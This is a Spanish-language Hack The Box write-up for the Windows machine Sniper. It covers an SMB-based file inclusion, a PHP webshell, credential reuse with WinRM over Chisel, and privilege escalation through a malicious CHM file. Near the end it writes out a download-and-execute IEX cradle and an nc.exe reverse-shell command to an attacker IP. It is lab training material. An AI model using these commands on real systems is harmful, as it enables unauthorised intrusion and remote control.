---
layout: single
title: HTB-Sniper
excerpt: "WriteUp con metodología de la máquina Sniper."
date: 2021-12-29
classes: wide
header:
  icon: /assets/images/hackthebox.webp
  teaser_home_page: true
  teaser: /assets/images/WriteUps/Sniper.png
categories:
  - WriteUps
tags:
  - HTB

---


<center><img src='/assets/images/WriteUps/Sniper.png'></center>

IP -> 10.10.10.151

# Reconocimiento
## Nmap
Utilizamos [nmap](/Nmap/) y obtenemos los siguientes resultados.

[Sniper Nmap Result](/assets/files/WriteUps/Sniper.txt)

## Crackmapexec
Usamos [Crackmapexec](/Crackmapexec/) para enumerar información del [Active Directory](/Active-Directory/) y añadimos el dominio al /etc/hosts
> OS: Windows 10
> Dominio: Sniper
> Signing: False
> SMBv1: False

## smbclient y smbhost
Listamos servicios mediante un [null session](/SMB/
Pero necesitamos credenciales.

## http
En la misma página, encontramos los directorios:

> /blog/index.php -> Podemos utilizar distintos idiomas. -> Cada idioma tiene un archivo asociado. 
> /user/login.php -> Panel de inicio de sesión -> Probamos credenciales por defecto


- Probamos un path traversal, en el parámetro lang.

> Tenemos LFI

- Probamos a convertirlo en un remote file inclusion.

Pero no funciona

- Probamos a cargar un archivo smb para tratar de crackear el hash.

> Es vulnerable a RFI por [SMB](/SMB/). Pero no vemos ningún hash.

- Tenemos que crear un recurso compartido con smbd linux.

```bash
service smbd start
net usershare add smbFolder $(pwd) '' 'Everyone:F' 'guest_ok=y'
```

- Creamos un archivo txt a modo de prueba

Triggeamos el RFI y funciona.

- Cargamos una webShell por php

> webShell

Nos enviamos una reverse shell cmd con **nc.exe**.

# User Pivoting (Chris)

## OS
```powershell
whoami /priv
```

> SeImpersonatePrivilege -> Podríamos utilizar [[Juicy Potato]] pero vamos a explotar la máquina de la forma intencionada.

```powershell
cd C:\inetpub\wwwroot
dir
cd user
dir
net user
net user Chris
```

> db.php -> Credentials
> Chris está en el "Remote Management Users" -> [winrm](/winrm/)

Probamos las credenciales para el usuario "Chris". Son válidas. Pero no tenemos PWNED
El [winrm](/winrm/) no está expuesto hacia fuera, hacemos port forwarding con [Chisel](/Chisel/) del puerto 5985.

Nos conectamos con [[winrm](/winrm/) a localhost con las credenciales de "Chris"
[ ! ] AppLockerBypass puede ser necesario.


# PrivEsc
```powershell
type C:\Users\Chris\desktop\user.txt
whoami /priv
cd C:\
dir
cd Docs
dir
type note.txt
cd C:\Users\Chris
dir
cd Downloads
dir
```

> user.txt

> note.txt -> En la nota vemos que tenemos que dejar la documentación de una nueva app en la carpeta C:\Docs
> instructions.chm -> Este tipo de archivos son archivos de ayuda

Sospechamos que el tipo de archivo que tenemos que crear es un .chm
Buscamos por "create malicious chm file". Para crearlo necesitamos hacerlo en una máquina windows de atacante.

- Descargamos HTML Help Workshop porque la herramienta lo requiere.
- Utilizamos la herramienta de "nishang" [Out-CHM.ps1](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)
- Nos sincronizamos al recurso y creamos el archivo malicioso.

```powershell
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1')
Out-CHM "C:\Users\Chris\Desktop\nc.exe -e cmd 10.10.14.13 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

- Movemos el archivo malicioso a la máquina víctima a la ruta C:\Docs y nos ponemos en escucha con **netcat**.

> root.txt


---

Escrito el 29-12-2021 a las 01:41 am por creep33.
